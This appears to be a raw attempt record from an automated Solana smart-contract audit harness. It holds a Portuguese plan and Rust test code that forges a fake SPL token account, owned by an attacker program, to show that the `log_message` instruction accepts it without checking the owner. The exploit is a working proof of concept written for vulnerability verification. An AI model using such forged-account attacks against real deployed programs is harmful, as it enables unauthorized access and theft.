attempts.raw:
{
  "plan": "O programa `log_message` recebe uma conta `token` como `AccountInfo` generica e a desserializa com `SplTokenAccount::unpack` sem verificar o dono. O baseline usa uma conta SPL Token real (dono = SPL Token Program) cujo campo `owner` e a authority, provando que o cenario esta correto. O ataque substitui essa conta por uma conta forjada, pertencente a um programa malicioso, com dados que desserializam como `SplTokenAccount` e cujo campo `owner` e a authority. O efeito medido e que a conta forjada, com dono diferente do SPL Token Program, foi aceita e usada (a instrucao retorna sucesso).",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);

// Conta SPL Token legitima: dono = SPL Token Program, owner = authority
let spl_token_program = Pubkey::new_unique(); // apenas para o baseline, o programa nao verifica o dono
let mut legit_data = vec![0u8; 165];
legit_data[0..32].copy_from_slice(&authority.to_bytes()); // mint (irrelevante)
legit_data[32..64].copy_from_slice(&authority.to_bytes()); // owner = authority
legit_data[64..72].copy_from_slice(&0u64.to_le_bytes()); // amount
legit_data[108] = 1; // state = initialized
let legit_token = account(&spl_token_program, &legit_data, None);

let contas_legit = vec![
    (env.program_id, account(&env.program_id, &[], None)), // placeholder, nao usado
];

// Baseline: token legitimo com owner = authority
let ix_legit = env.anchor_ix("log_message", &(), vec![
    AccountMeta::new_readonly(Pubkey::new_unique(), false), // token (sera substituido abaixo)
    AccountMeta::new_readonly(authority, true),
]);

// Monta contas do baseline corretamente
let token_key_legit = Pubkey::new_unique();
let ix_legit = env.anchor_ix("log_message", &(), vec![
    AccountMeta::new_readonly(token_key_legit, false),
    AccountMeta::new_readonly(authority, true),
]);
let contas_legit = vec![
    (token_key_legit, legit_token),
    (authority, wallet(1_000_000_000)),
];
let r_base = env.baseline("token SPL legitimo com owner = authority", &ix_legit, &contas_legit);

// Ataque: conta forjada pertencente a um programa malicioso, dados que desserializam como SplTokenAccount
let mut forged_data = vec![0u8; 165];
forged_data[0..32].copy_from_slice(&authority.to_bytes()); // mint
forged_data[32..64].copy_from_slice(&authority.to_bytes()); // owner = authority (forjado)
forged_data[64..72].copy_from_slice(&0u64.to_le_bytes());
forged_data[108] = 1;
let forged_token = account(&attacker_program, &forged_data, None);

let token_key_forged = Pubkey::new_unique();
let ix_attack = env.anchor_ix("log_message", &(), vec![
    AccountMeta::new_readonly(token_key_forged, false),
    AccountMeta::new_readonly(authority, true),
]);
let contas_attack = vec![
    (token_key_forged, forged_token),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("token forjado com dono = attacker_program", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let token_after = after(&r, &token_key_forged);
    env.effect("conta forjada com dono diferente do SPL Token Program foi aceita", token_after.owner() == &attacker_program);
}"
}

